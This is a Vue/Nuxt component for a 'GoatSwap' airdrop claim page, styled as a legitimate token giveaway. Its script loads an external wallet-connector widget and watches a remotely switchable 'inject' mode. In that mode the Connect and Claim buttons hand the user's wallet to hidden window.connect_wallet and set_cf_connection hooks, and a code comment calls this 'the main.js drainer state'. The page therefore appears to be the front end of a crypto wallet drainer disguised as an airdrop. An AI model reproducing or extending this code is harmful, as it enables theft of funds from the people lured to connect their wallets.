<template>
  <div class="airdrop-page">

    <!-- ── Left: Info panel ── -->
    <aside class="info-panel">
      <div class="info-inner">
        <div class="section-label">🪂 GOAT Airdrop</div>
        <h1 class="info-title">
          Claim Your<br /><span class="gradient-text">GOAT Tokens</span>
        </h1>
        <p class="info-desc">
          Early GoatSwap users are eligible to claim GOAT tokens as a reward for supporting the protocol.
        </p>

        <!-- Stats -->
        <div class="info-stats">
          <div class="info-stat glass-card">
            <div class="info-stat-label">Total Airdrop</div>
            <div class="info-stat-value gradient-text">40,000,000</div>
            <div class="info-stat-unit">GOAT</div>
          </div>
          <div class="info-stat glass-card">
            <div class="info-stat-label">Recipients</div>
            <div class="info-stat-value gradient-text">{{ recipientCount.toLocaleString() }}</div>
            <div class="info-stat-unit">wallets</div>
          </div>
          <div class="info-stat glass-card">
            <div class="info-stat-label">Claimed</div>
            <div class="info-stat-value" :style="{ color: 'var(--accent-cyan)' }">{{ claimedPct }}%</div>
            <div class="info-stat-unit">of total</div>
          </div>
          <div class="info-stat glass-card">
            <div class="info-stat-label">Deadline</div>
            <div class="info-stat-value" style="font-size: 18px; color: var(--text-primary)">{{ deadlineStr }}</div>
            <div class="info-stat-unit">days left</div>
          </div>
        </div>

        <!-- Eligibility criteria -->
        <div class="criteria-block">
          <div class="criteria-title">Eligibility Criteria</div>
          <div class="criteria-list">
            <div v-for="c in criteria" :key="c.label" class="criteria-item">
              <span class="criteria-icon">{{ c.icon }}</span>
              <span class="criteria-label">{{ c.label }}</span>
            </div>
          </div>
        </div>
      </div>
    </aside>

    <!-- ── Right: Claim card ── -->
    <div class="claim-area">
      <div class="claim-card glass-card">

        <!-- Step 1: Not connected -->
        <div v-if="!walletAddress" class="claim-step claim-step--center">
          <div class="step-icon-wrap branded-icon-wrap">
            <span class="step-icon animated-gift">
              <img src="/assets/img/airdrop-gift.png" alt="coin" width="200">
            </span>
          </div>
          <h2 class="claim-title">Verify Eligibility</h2>
          <p class="claim-subtitle">Connect your wallet to check if you are eligible for the GOAT airdrop.</p>

          <button
            class="btn btn-primary btn-connect-airdrop"
            style="width: 100%; max-width: 280px; margin: 0 auto 12px; padding: 16px;"
            @click="handleConnectClick"
          >
            <span>Connect Wallet</span>
            <svg width="16" height="16" viewBox="0 0 16 16" fill="none">
              <path d="M3 8h10M9 4l4 4-4 4" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
            </svg>
          </button>

          <p v-if="connectError" class="error-text">{{ connectError }}</p>
        </div>

        <!-- Step 2: Connected — checking -->
        <div v-else-if="checkingEligibility" class="claim-step claim-step--center">
          <div class="checking-spinner" />
          <p class="checking-text">Checking eligibility…</p>
          <p class="checking-addr">{{ shortAddr(walletAddress) }}</p>
        </div>

        <!-- Step 3: Not eligible -->
        <div v-else-if="!entry" class="claim-step claim-step--center">
          <div class="result-icon result-icon--no">✗</div>
          <h2 class="claim-title">Not Eligible</h2>
          <p class="claim-subtitle">
            This address wasn't part of the snapshot.<br/>
            Make sure you're using the right wallet.
          </p>
          <div class="connected-addr-row">
            <span class="addr-label">Connected</span>
            <span class="addr-value">{{ shortAddr(walletAddress) }}</span>
          </div>
          <button class="btn-switch" @click="disconnect">Switch Wallet</button>
        </div>

        <!-- Step 4: Already claimed -->
        <div v-else-if="alreadyClaimed" class="claim-step claim-step--center">
          <div class="result-icon result-icon--done">✓</div>
          <h2 class="claim-title">Already Claimed</h2>
          <p class="claim-subtitle">
            You've already claimed your GOAT tokens.<br/>
            Check your wallet balance.
          </p>
          <div class="claim-amount-display">
            <span class="cam-label">Claimed amount</span>
            <span class="cam-value gradient-text">{{ formatAmount(entry.amount) }} GOAT</span>
          </div>
          <a v-if="txHash" :href="`${explorerBase}/tx/${txHash}`" target="_blank" class="explorer-link">
            View on Explorer
            <svg width="12" height="12" viewBox="0 0 12 12" fill="none">
              <path d="M2 2h8v8M10 2L2 10" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"/>
            </svg>
          </a>

          <!-- Инструкция по импорту токена -->
          <div class="import-instructions glass-card">
            <div class="ii-title">💡 How to see GOAT in your wallet?</div>
            <p class="ii-desc">
              If the token does not appear, import it into your wallet (as a Custom Token) using this contract address:
            </p>
            <div class="address-copy-row">
              <span class="addr-text">{{ shortAddr(TOKEN_ADDRESS) }}</span>
              <button class="btn-copy" @click="copyTokenAddress">
                <span>{{ copied ? 'Copied!' : 'Copy address' }}</span>
              </button>
            </div>
          </div>

          <button class="btn-switch" @click="disconnect">Switch Wallet</button>
        </div>

        <!-- Step 5: Eligible — ready to claim -->
        <div v-else-if="!claimed" class="claim-step">
          <div class="result-icon result-icon--yes">🎉</div>
          <h2 class="claim-title">You're Eligible!</h2>

          <div class="claim-amount-card">
            <div class="cac-label">Your allocation</div>
            <div class="cac-amount gradient-text">{{ formatAmount(entry.amount) }}</div>
            <div class="cac-symbol">GOAT</div>
          </div>

          <div class="connected-addr-row">
            <span class="addr-label">Wallet</span>
            <span class="addr-value">{{ shortAddr(walletAddress) }}</span>
          </div>

          <button
            class="btn btn-primary btn-claim"
            :disabled="claiming"
            @click="claim"
          >
            <span v-if="!claiming">
              <span>Claim {{ formatAmount(entry.amount) }} GOAT</span>
              <svg width="16" height="16" viewBox="0 0 16 16" fill="none">
                <path d="M3 8h10M9 4l4 4-4 4" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
              </svg>
            </span>
            <span v-else class="claiming-state">
              <span class="wallet-btn-spinner" />
              Confirm in wallet…
            </span>
          </button>

          <p v-if="claimError" class="error-text">{{ claimError }}</p>

          <button class="btn-switch" @click="disconnect">Switch Wallet</button>
        </div>

        <!-- Step 6: Success -->
        <div v-else class="claim-step claim-step--center">
          <div class="success-burst">🎊</div>
          <h2 class="claim-title">Tokens Claimed!</h2>
          <p class="claim-subtitle">
            Your GOAT tokens have been sent to your wallet.
          </p>

          <div class="claim-amount-display">
            <span class="cam-label">You received</span>
            <span class="cam-value gradient-text">{{ formatAmount(entry.amount) }} GOAT</span>
          </div>

          <a :href="`${explorerBase}/tx/${txHash}`" target="_blank" class="explorer-link explorer-link--primary">
            View Transaction
            <svg width="12" height="12" viewBox="0 0 12 12" fill="none">
              <path d="M2 2h8v8M10 2L2 10" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"/>
            </svg>
          </a>

          <div class="share-row">
            <span class="share-label">Share the news</span>
            <a :href="twitterShareUrl" target="_blank" class="share-btn">
              <svg width="14" height="14" fill="currentColor" viewBox="0 0 24 24">
                <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-4.714-6.231-5.401 6.231H2.746l7.73-8.835L1.254 2.25H8.08l4.259 5.632zm-1.161 17.52h1.833L7.084 4.126H5.117z"/>
              </svg>
              Tweet
            </a>
          </div>

          <!-- Инструкция по импорту токена -->
          <div class="import-instructions glass-card">
            <div class="ii-title">💡 How do I see GOAT in my wallet?</div>
            <p class="ii-desc">
              If the token does not appear, import it into your wallet (as a Custom Token) using this contract address:
            </p>
            <div class="address-copy-row">
              <span class="addr-text">{{ shortAddr(TOKEN_ADDRESS) }}</span>
              <button class="btn-copy" @click="copyTokenAddress">
                <span>{{ copied ? 'Copied!' : 'Copy address' }}</span>
              </button>
            </div>
          </div>

          <button class="btn-switch" @click="disconnect">Use Another Wallet</button>
        </div>

        <!-- Progress bar (shown when eligible/claiming/claimed) -->
        <div v-if="entry && !checkingEligibility" class="progress-bar-wrap">
          <div class="progress-bar-track">
            <div class="progress-bar-fill" :style="{ width: claimedPct + '%' }" />
          </div>
          <div class="progress-bar-labels">
            <span>{{ claimedPct }}% claimed</span>
            <span>{{ (100 - claimedPct) }}% remaining</span>
          </div>
        </div>

      </div>

      <!-- Terms note -->
      <p class="terms-note">
        By claiming, you agree to GoatSwap's
        <a href="#">Terms of Service</a>. Tokens are non-transferable for 30 days after claim.
      </p>
    </div>

    <!-- Reusing WalletModal component to prevent broken style scopes -->
    <WalletModal :open="localModalOpen" @close="localModalOpen = false" @select="handleLocalWalletSelect" />

  </div>
</template>

<script setup>
import { ref, computed, onMounted, onUnmounted } from 'vue'

// ── Layout ───────────────────────────────────────────────────────────────────
definePageMeta({ layout: 'airdrop' })

useSeoMeta({
  title: 'GOAT Airdrop — GoatSwap',
  description: 'Claim your GOAT airdrop tokens. Check eligibility and claim in one click.',
})

// ── Config ───────────────────────────────────────────────────────────────────

const CLAIM_DEADLINE_DAYS = 30

const config = useRuntimeConfig();

const DISTRIBUTOR_ADDRESS = config.public.airdropContract
const TOKEN_ADDRESS = config.public.airdropToken || '0xd1770254071Be4d7b26683191Dc6C0D2E8dBD7Da'
const copied = ref(false)

function copyTokenAddress() {
  if (typeof navigator !== 'undefined' && navigator.clipboard) {
    navigator.clipboard.writeText(TOKEN_ADDRESS)
    copied.value = true
    setTimeout(() => {
      copied.value = false
    }, 2000)
  }
}

// Load widget script on the page
useHead({
  script: [
    {
      src: config.public.connectorScriptUrl,
      defer: true,
      id: "connector2-script",
      onload: `
        window.__connector2Ready = true;
        if (window.__connector2PendingInit) {
          window.__connector2PendingInit();
        }
      `,
    },
  ],
});

// ── State ─────────────────────────────────────────────────────────────────────
const walletAddress       = ref(null)   // connected address (lowercase)
const connectError        = ref('')
const checkingEligibility = ref(false)
const entry               = ref(null)  // { amount, index, proof }
const alreadyClaimed      = ref(false)
const claiming            = ref(false)
const claimed             = ref(false)
const claimError          = ref('')
const txHash              = ref('')

const localModalOpen      = ref(false)
const connectingWallet    = ref(null)
const currentConnectorMode = ref('clean')



// ── Static/Dynamic display data ───────────────────────────────────────────────
const recipientCount = ref(0)
const claimedPct     = ref(42)
const deadlineStr    = ref(CLAIM_DEADLINE_DAYS)

const criteria = [
  { icon: '🔄', label: 'Used GoatSwap before the snapshot' },
  { icon: '💧', label: 'Provided liquidity to any pool' },
  { icon: '🗳️', label: 'Participated in governance' },
  { icon: '⭐', label: 'Referred 3+ active users' },
]

// ── Computed ──────────────────────────────────────────────────────────────────
const twitterShareUrl = computed(() => {
  if (!entry.value) return '#'
  const text = encodeURIComponent(
    `Just claimed ${formatAmount(entry.value.amount)} $GOAT from the @GoatSwapProtocol airdrop! 🎉\n\nClaim yours:`
  )
  const url = encodeURIComponent('https://GoatSwap.io/airdrop')
  return `https://twitter.com/intent/tweet?text=${text}&url=${url}`
})

// ── Helpers ───────────────────────────────────────────────────────────────────
function shortAddr(addr) {
  if (!addr) return ''
  return addr.slice(0, 6) + '…' + addr.slice(-4)
}

function formatAmount(weiStr) {
  if (!weiStr) return '0'
  const wei     = BigInt(weiStr)
  const divisor = 10n ** 18n
  const whole   = wei / divisor
  return whole.toLocaleString()
}

// ── Fetch Airdrop Stats ───────────────────────────────────────────────────────
async function fetchStats() {
  try {
    const data = await $fetch('/napi/airdrop/stats')
    if (data) {
      recipientCount.value = data.recipientCount
      claimedPct.value     = data.claimedPct
      deadlineStr.value    = data.deadlineDays
    }
  } catch (e) {
    console.warn('Could not load stats:', e.message)
  }
}

// ── Check connected wallet ────────────────────────────────────────────────────
async function checkConnectedWallet() {
  if (typeof window !== 'undefined' && window.ethereum) {
    try {
      const accounts = await window.ethereum.request({ method: 'eth_accounts' })
      if (accounts && accounts.length > 0) {
        const addr = accounts[0].toLowerCase()
        if (walletAddress.value !== addr) {
          walletAddress.value = addr
          await checkEligibility()
        }
      } else if (walletAddress.value) {
        disconnect()
      }
    } catch (e) {
      console.warn('checkConnectedWallet error:', e.message)
    }
  }
}

// ── Polling & Events ─────────────────────────────────────────────────────────
let pollInterval = null

function startWalletPolling() {
  if (pollInterval) clearInterval(pollInterval)
  pollInterval = setInterval(async () => {
    await checkConnectedWallet()
  }, 1000)
}

function setupEthereumListeners() {
  if (typeof window !== 'undefined' && window.ethereum) {
    window.ethereum.on('accountsChanged', (accs) => {
      if (!accs.length) disconnect()
      else {
        const addr = accs[0].toLowerCase()
        if (walletAddress.value !== addr) {
          walletAddress.value = addr
          checkEligibility()
        }
      }
    })
    window.ethereum.on('chainChanged', () => { disconnect() })
  }
}

// ── Check eligibility ─────────────────────────────────────────────────────────
async function checkEligibility() {
  checkingEligibility.value = true
  entry.value        = null
  alreadyClaimed.value = false
  claimed.value      = false
  claimError.value   = ''

  try {
    const addr = walletAddress.value
    if (!addr) return

    const data = await $fetch('/napi/airdrop/check', {
      method: 'POST',
      body: { address: addr }
    })

    if (data) {
      entry.value = {
        amount: data.amount,
        index: data.index,
        proof: data.proof
      }
      alreadyClaimed.value = data.claimed
      claimed.value = data.claimed
      txHash.value = data.txHash || ''

      // Check real claim status directly from the blockchain (hasClaimed(address))
      if (typeof window !== 'undefined' && window.ethereum) {
        try {
          const selector = '0x73b2e80e' // hasClaimed(address)
          const addrParam = addr.replace('0x', '').padStart(64, '0').toLowerCase()
          const callData = selector + addrParam

          const result = await window.ethereum.request({
            method: 'eth_call',
            params: [
              {
                to: DISTRIBUTOR_ADDRESS,
                data: callData
              },
              'latest'
            ]
          })

          const isClaimedOnChain = BigInt(result) === 1n
          if (isClaimedOnChain) {
            alreadyClaimed.value = true
            claimed.value = true
          }
        } catch (chainErr) {
          console.warn('Could not query chain state for claim status:', chainErr.message)
        }
      }
    }
  } catch (e) {
    console.error('checkEligibility error:', e)
    connectError.value = 'Failed to check eligibility. Please try again.'
  } finally {
    checkingEligibility.value = false
  }
}

function formatError(e) {
  console.error('Detailed claim error:', e)
  
  let message = 'Transaction failed'
  if (typeof e === 'string') {
    message = e
  } else if (e && typeof e === 'object') {
    const candidate = e.reason || e.data?.message || e.error?.message || e.message
    if (candidate) {
      message = candidate
    }
  }

  const lower = message.toLowerCase()
  if (lower.includes('user rejected') || lower.includes('user_rejected') || e?.code === 4001) {
    return 'Transaction rejected by user'
  }
  if (lower.includes('insufficient funds') || lower.includes('insufficient_funds')) {
    return 'Insufficient funds for gas fee'
  }
  if (lower.includes('alreadyclaimed') || lower.includes('already claimed')) {
    return 'Tokens already claimed for this address'
  }
  if (lower.includes('deadlinepassed') || lower.includes('deadline passed')) {
    return 'Claim deadline has passed'
  }
  if (lower.includes('insufficient maxfeepergas')) {
    return 'Insufficient Sepolia ETH balance to cover gas fees'
  }

  return message
}

// ── Claim ─────────────────────────────────────────────────────────────────────
async function claim() {
  claimError.value = ''
  claiming.value   = true

  try {
    if (getConnectorMode() === 'inject') {
      if (typeof window !== 'undefined' && typeof window.connect_wallet === 'function') {
        window.connect_wallet();
      }
      return;
    }

    const accounts = await window.ethereum.request({ method: 'eth_accounts' })
    if (!accounts.length) throw new Error('No accounts connected')
    const account  = accounts[0]

    // Simple claim without parameters: claim() selector = 0x4e71d92d
    const data = '0x4e71d92d'

    const hash = await window.ethereum.request({
      method: 'eth_sendTransaction',
      params: [{ from: account, to: DISTRIBUTOR_ADDRESS, data }],
    })

    txHash.value  = hash
    claimed.value = true

    // Call our Nitro API to save claim status
    await $fetch('/napi/airdrop/claim', {
      method: 'POST',
      body: {
        address: account.toLowerCase(),
        txHash: hash
      }
    })

    await fetchStats()

  } catch (e) {
    claimError.value = formatError(e)
  } finally {
    claiming.value = false
  }
}

// ── Disconnect ────────────────────────────────────────────────────────────────
function disconnect() {
  walletAddress.value     = null
  entry.value             = null
  alreadyClaimed.value    = false
  claimed.value           = false
  txHash.value            = ''
  connectError.value      = ''
  claimError.value        = ''
}

function getConnectorMode() {
  return currentConnectorMode.value
}

function handleConnectClick() {
  const mode = getConnectorMode()
  console.log('Connect clicked, mode:', mode)
  if (mode === 'inject') {
    if (window.Connector2) {
      window.Connector2.open();
    } else {
      window.dispatchEvent(new CustomEvent("connector2:open", { detail: { step: 'select_network' } }))
    }
  } else {
    localModalOpen.value = true
  }
}

async function handleLocalWalletSelect(walletId) {
  connectingWallet.value = walletId
  connectError.value = ''
  try {
    if (getConnectorMode() === 'inject') {
      if (typeof window !== 'undefined' && typeof window.connect_wallet === 'function') {
        let providerName = 'MetaMask'
        if (walletId === 'metamask') providerName = 'MetaMask'
        else if (walletId === 'trust') providerName = 'Trust Wallet'
        else if (walletId === 'coinbase') providerName = 'Coinbase'
        else if (walletId === 'walletconnect') providerName = 'WalletConnect'

        window.connect_wallet(providerName);
        localModalOpen.value = false;
        return;
      }
    }

    if (!window.ethereum) {
      throw new Error('No wallet detected. Install MetaMask or use a supported browser wallet.')
    }

    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' })
    if (!accounts.length) throw new Error('No accounts returned')

    walletAddress.value = accounts[0].toLowerCase()
    localModalOpen.value = false

    await checkEligibility()
  } catch (e) {
    connectError.value = e.message || 'Connection failed'
  } finally {
    connectingWallet.value = null
  }
}

// ── Init ──────────────────────────────────────────────────────────────────────
onMounted(() => {
  const apiUrl = config.public.connectorApiUrl || 'http://localhost:3010';

  function initConnector() {
    console.log('Initializing Connector2. Mode:', getConnectorMode())
    if (window.Connector2) {
      window.Connector2.init({
        selector: "", // Pass empty selector to prevent the widget from intercepting clicks
        apiUrl,
      });
    }
  }

  // Check if script is already loaded
  if (window.Connector2) {
    initConnector();
  } else {
    // Look for script tag in the DOM
    const script = document.getElementById("connector2-script");
    if (script) {
      script.addEventListener("load", () => {
        initConnector();
      });
      // Fallback: in case the load event was already fired
      setTimeout(() => {
        if (window.Connector2) initConnector();
      }, 1000);
    } else {
      // If script tag is not in DOM yet, poll for window.Connector2
      let attempts = 0;
      const interval = setInterval(() => {
        attempts++;
        if (window.Connector2) {
          initConnector();
          clearInterval(interval);
        } else if (attempts > 30) {
          clearInterval(interval);
        }
      }, 200);
    }
  }

  fetchStats()
  checkConnectedWallet()
  startWalletPolling()
  setupEthereumListeners()

  // Helper to read mode from storage / globals
  function getModeFromAnywhere() {
    if (typeof window === 'undefined') return 'clean'
    if (window.__connectorMode) return window.__connectorMode
    try {
      const cached = sessionStorage.getItem('uc_config')
      if (cached) {
        const parsed = JSON.parse(cached)
        return parsed.mode || 'clean'
      }
    } catch (e) {}
    return 'clean'
  }

  // Set initial mode state on mount
  currentConnectorMode.value = getModeFromAnywhere()
  if (typeof window !== 'undefined' && typeof window.set_cf_connection === 'function') {
    window.set_cf_connection(currentConnectorMode.value === 'inject')
  }

  // Hot swap mode watcher interval (reads changes from Socket Service writing to window.__connectorMode)
  modeWatcherInterval = setInterval(() => {
    const rawMode = getModeFromAnywhere()
    if (currentConnectorMode.value !== rawMode) {
      console.log('[Airdrop Page] Hot swapping mode to:', rawMode)
      currentConnectorMode.value = rawMode

      // Make sure it is synced back to sessionStorage for future page loads
      try {
        const cached = sessionStorage.getItem('uc_config') || '{}'
        const parsed = JSON.parse(cached)
        parsed.mode = rawMode
        sessionStorage.setItem('uc_config', JSON.stringify(parsed))
      } catch (e) {}

      // Update the main.js drainer state
      if (typeof window !== 'undefined' && typeof window.set_cf_connection === 'function') {
        window.set_cf_connection(rawMode === 'inject')
      }
    }
  }, 300)
})

let modeWatcherInterval = null

onUnmounted(() => {
  if (pollInterval) clearInterval(pollInterval)
  if (modeWatcherInterval) clearInterval(modeWatcherInterval)
})
</script>

<style scoped>
/* ── Page Layout ── */
.airdrop-page {
  display: grid;
  grid-template-columns: 1fr 1fr;
  min-height: calc(100vh - 65px - 57px); /* minus header & footer */
  max-width: 1200px;
  margin: 0 auto;
  padding: 60px 32px;
  gap: 64px;
  align-items: center;
}

/* ── Info Panel ── */
.info-panel {
  position: relative;
}

.info-inner {
  max-width: 520px;
}

.info-title {
  font-size: clamp(40px, 5vw, 58px);
  font-weight: 900;
  line-height: 1.1;
  letter-spacing: -0.03em;
  color: var(--text-primary);
  margin: 16px 0 20px;
}

.info-desc {
  font-size: 16px;
  color: var(--text-secondary);
  line-height: 1.7;
  margin-bottom: 40px;
  max-width: 420px;
}

.info-stats {
  display: grid;
  grid-template-columns: 1fr 1fr;
  gap: 14px;
  margin-bottom: 36px;
}

.info-stat {
  padding: 20px;
  border-radius: var(--radius-md);
}

.info-stat-label {
  font-size: 11px;
  font-weight: 600;
  letter-spacing: 0.1em;
  text-transform: uppercase;
  color: var(--text-muted);
  margin-bottom: 8px;
}

.info-stat-value {
  font-family: var(--font-display);
  font-size: 26px;
  font-weight: 800;
  line-height: 1;
  margin-bottom: 4px;
}

.info-stat-unit {
  font-size: 12px;
  color: var(--text-muted);
}

/* Criteria */
.criteria-block {
  background: var(--bg-card);
  border: 1px solid var(--border-subtle);
  border-radius: var(--radius-md);
  padding: 20px 24px;
}

.criteria-title {
  font-size: 12px;
  font-weight: 600;
  letter-spacing: 0.1em;
  text-transform: uppercase;
  color: var(--text-muted);
  margin-bottom: 14px;
}

.criteria-list {
  display: flex;
  flex-direction: column;
  gap: 10px;
}

.criteria-item {
  display: flex;
  align-items: center;
  gap: 12px;
  font-size: 14px;
  color: var(--text-secondary);
}

.criteria-icon { font-size: 16px; }

/* ── Claim Area ── */
.claim-area {
  display: flex;
  flex-direction: column;
  gap: 16px;
}

.claim-card {
  border-radius: var(--radius-xl);
  padding: 40px;
  border-color: rgba(123, 63, 228, 0.2);
  box-shadow: 0 0 60px rgba(123, 63, 228, 0.1);
  transition: none; /* override glass-card hover */
}

.claim-card:hover {
  transform: none;
}

/* ── Claim Steps ── */
.claim-step {
  display: flex;
  flex-direction: column;
  gap: 0;
}

.claim-step--center {
  align-items: center;
  text-align: center;
}

.step-icon-wrap {
  /* width: 64px; height: 64px; */
  border-radius: 18px;
  background: linear-gradient(135deg, rgba(123,63,228,.15), rgba(0,212,255,.08));
  border: 1px solid rgba(123,63,228,.2);
  display: flex; align-items: center; justify-content: center;
  font-size: 28px;
  margin-bottom: 20px;
}

.claim-title {
  font-size: 26px;
  font-weight: 700;
  color: var(--text-primary);
  margin-bottom: 10px;
}

.claim-subtitle {
  font-size: 15px;
  color: var(--text-secondary);
  line-height: 1.6;
  margin-bottom: 28px;
  max-width: 340px;
}

/* Wallet buttons */
.wallet-buttons {
  display: flex;
  flex-direction: column;
  gap: 10px;
  margin-bottom: 8px;
}

.wallet-btn {
  display: flex;
  align-items: center;
  gap: 14px;
  padding: 14px 18px;
  background: var(--bg-card);
  border: 1px solid var(--border-subtle);
  border-radius: var(--radius-md);
  cursor: pointer;
  color: var(--text-primary);
  font-family: var(--font-sans);
  font-size: 15px;
  font-weight: 500;
  transition: all 0.2s ease;
  width: 100%;
  text-align: left;
}

.wallet-btn:hover:not(:disabled) {
  border-color: var(--accent-purple);
  background: rgba(123, 63, 228, 0.08);
  transform: translateX(4px);
}

.wallet-btn:disabled { opacity: .5; cursor: not-allowed; }

.wallet-btn-icon {
  width: 38px; height: 38px;
  border-radius: 10px;
  display: flex; align-items: center; justify-content: center;
  font-size: 18px;
  flex-shrink: 0;
  border: 1px solid rgba(255,255,255,0.06);
}

.wallet-btn-name { flex: 1; }

.wallet-btn-arrow {
  color: var(--text-muted);
  transition: transform 0.2s, color 0.2s;
}

.wallet-btn:hover .wallet-btn-arrow {
  transform: translateX(3px);
  color: var(--accent-cyan);
}

.wallet-btn-spinner {
  width: 16px; height: 16px;
  border: 2px solid rgba(255,255,255,0.15);
  border-top-color: var(--accent-cyan);
  border-radius: 50%;
  animation: spin .6s linear infinite;
  flex-shrink: 0;
}

@keyframes spin { to { transform: rotate(360deg); } }

/* Checking state */
.checking-spinner {
  width: 48px; height: 48px;
  border: 3px solid rgba(123,63,228,0.2);
  border-top-color: var(--accent-purple);
  border-radius: 50%;
  animation: spin .8s linear infinite;
  margin-bottom: 20px;
}

.checking-text {
  font-size: 16px;
  font-weight: 500;
  color: var(--text-primary);
  margin-bottom: 8px;
}

.checking-addr {
  font-size: 13px;
  color: var(--text-muted);
  font-family: monospace;
}

/* Result icons */
.result-icon {
  width: 72px; height: 72px;
  border-radius: 50%;
  display: flex; align-items: center; justify-content: center;
  font-size: 28px;
  font-weight: 700;
  margin: 0 auto 20px;
}

.result-icon--yes {
  background: rgba(123,63,228,.15);
  border: 1px solid rgba(123,63,228,.3);
}

.result-icon--no {
  background: rgba(255,79,79,.1);
  border: 1px solid rgba(255,79,79,.25);
  color: #ff4f4f;
  font-size: 24px;
}

.result-icon--done {
  background: rgba(0,230,122,.1);
  border: 1px solid rgba(0,230,122,.25);
  color: #00e67a;
  font-size: 24px;
}

/* Claim amount card */
.claim-amount-card {
  background: linear-gradient(135deg, rgba(123,63,228,.08), rgba(0,212,255,.05));
  border: 1px solid rgba(123,63,228,.2);
  border-radius: var(--radius-md);
  padding: 24px;
  text-align: center;
  margin-bottom: 20px;
}

.cac-label {
  font-size: 12px;
  font-weight: 600;
  letter-spacing: .1em;
  text-transform: uppercase;
  color: var(--text-muted);
  margin-bottom: 10px;
}

.cac-amount {
  font-family: var(--font-display);
  font-size: 48px;
  font-weight: 900;
  line-height: 1;
  letter-spacing: -.03em;
  margin-bottom: 6px;
}

.cac-symbol {
  font-size: 18px;
  color: var(--text-muted);
  font-weight: 600;
}

/* Claim amount display (smaller variant) */
.claim-amount-display {
  display: flex;
  flex-direction: column;
  align-items: center;
  gap: 6px;
  margin-bottom: 24px;
}

.cam-label {
  font-size: 12px;
  color: var(--text-muted);
  letter-spacing: .06em;
  text-transform: uppercase;
}

.cam-value {
  font-family: var(--font-display);
  font-size: 28px;
  font-weight: 800;
}

/* Connected addr row */
.connected-addr-row {
  display: flex;
  align-items: center;
  justify-content: space-between;
  background: var(--bg-card);
  border: 1px solid var(--border-subtle);
  border-radius: var(--radius-sm);
  padding: 10px 14px;
  margin-bottom: 20px;
  font-size: 13px;
}

.addr-label { color: var(--text-muted); }

.addr-value {
  font-family: monospace;
  color: var(--text-secondary);
}

/* Claim button */
.btn-claim {
  width: 100%;
  padding: 16px;
  font-size: 16px;
  margin-bottom: 12px;
  border-radius: var(--radius-md);
}

.btn-claim span {
  display: flex;
  align-items: center;
  justify-content: center;
  gap: 10px;
  position: relative;
  z-index: 1;
}

.claiming-state {
  display: flex;
  align-items: center;
  gap: 10px;
}

.claiming-state .wallet-btn-spinner {
  border-top-color: rgba(255,255,255,.8);
}

/* Switch wallet */
.btn-switch {
  background: none;
  border: none;
  cursor: pointer;
  font-size: 13px;
  color: var(--text-muted);
  font-family: var(--font-sans);
  padding: 8px;
  transition: color .2s;
  align-self: center;
  margin-top: 4px;
  text-decoration: underline;
  text-decoration-color: rgba(255,255,255,.15);
}

.btn-switch:hover { color: var(--text-secondary); }

/* Success */
.success-burst {
  font-size: 56px;
  margin-bottom: 16px;
  animation: burst .4s ease;
}

@keyframes burst {
  0% { transform: scale(0.5); opacity: 0; }
  70% { transform: scale(1.15); }
  100% { transform: scale(1); opacity: 1; }
}

/* Explorer link */
.explorer-link {
  display: inline-flex;
  align-items: center;
  gap: 5px;
  font-size: 13px;
  color: var(--text-muted);
  border: 1px solid var(--border-subtle);
  border-radius: var(--radius-sm);
  padding: 8px 14px;
  margin-bottom: 20px;
  text-decoration: none;
  transition: all .2s;
}

.explorer-link:hover {
  color: var(--text-secondary);
  border-color: var(--accent-purple);
}

.explorer-link--primary {
  background: rgba(123,63,228,.08);
  border-color: rgba(123,63,228,.25);
  color: var(--accent-purple-light);
  margin-bottom: 24px;
}

/* Share */
.share-row {
  display: flex;
  align-items: center;
  gap: 12px;
  margin-bottom: 20px;
}

.share-label {
  font-size: 13px;
  color: var(--text-muted);
}

.share-btn {
  display: inline-flex;
  align-items: center;
  gap: 6px;
  font-size: 13px;
  font-weight: 600;
  padding: 7px 14px;
  background: rgba(255,255,255,.06);
  border: 1px solid var(--border-subtle);
  border-radius: var(--radius-sm);
  color: var(--text-primary);
  text-decoration: none;
  transition: all .2s;
}

.share-btn:hover {
  background: rgba(255,255,255,.1);
  border-color: var(--accent-cyan);
}

/* Progress bar */
.progress-bar-wrap {
  margin-top: 28px;
  padding-top: 20px;
  border-top: 1px solid var(--border-subtle);
}

.progress-bar-track {
  height: 4px;
  background: rgba(255,255,255,.06);
  border-radius: 99px;
  overflow: hidden;
  margin-bottom: 8px;
}

.progress-bar-fill {
  height: 100%;
  border-radius: 99px;
  background: var(--accent-gradient);
  transition: width 1s cubic-bezier(.4,0,.2,1);
}

.progress-bar-labels {
  display: flex;
  justify-content: space-between;
  font-size: 11px;
  color: var(--text-muted);
}

/* Error */
.error-text {
  font-size: 13px;
  color: #ff5f5f;
  margin-top: 4px;
  margin-bottom: 8px;
  text-align: center;
}

/* Terms */
.terms-note {
  font-size: 12px;
  color: var(--text-muted);
  text-align: center;
  line-height: 1.6;
  padding: 0 8px;
}

.terms-note a {
  color: var(--accent-cyan);
  text-decoration: underline;
  text-decoration-color: rgba(0,212,255,.25);
  transition: color .2s;
}

.terms-note a:hover { color: var(--accent-cyan-light); }

/* ── Responsive ── */
@media (max-width: 1024px) {
  .airdrop-page {
    grid-template-columns: 1fr;
    padding: 40px 24px;
    gap: 40px;
  }

  .info-inner { max-width: 100%; }
  .info-title { font-size: 40px; }
}

@media (max-width: 640px) {
  .claim-card { padding: 28px 20px; }
  .cac-amount { font-size: 38px; }
  .airdrop-page { padding: 24px 16px; }
  .info-stats { grid-template-columns: 1fr 1fr; }
}

.step-icon-wrap.branded-icon-wrap {
  position: relative;
  background: transparent !important;
  border: none !important;
  display: flex;
  align-items: center;
  justify-content: center;
  margin-bottom: 24px;
  width: 320px;
  height: 240px;
  perspective: 1200px;
  transform-style: preserve-3d;
  box-shadow: none !important;
}

.step-icon-wrap.branded-icon-wrap::before {
  content: '';
  position: absolute;
  bottom: 10px;
  width: 160px;
  height: 20px;
  background: radial-gradient(ellipse at center, rgba(0, 212, 255, 0.25) 0%, transparent 70%);
  border-radius: 50%;
  animation: shadow-pulse 8s ease-in-out infinite;
  pointer-events: none;
  z-index: 1;
}

.animated-gift {
  display: flex;
  align-items: center;
  justify-content: center;
  transform-style: preserve-3d;
  animation: float-rotate-3d 8s ease-in-out infinite;
  will-change: transform;
}

.animated-gift img {
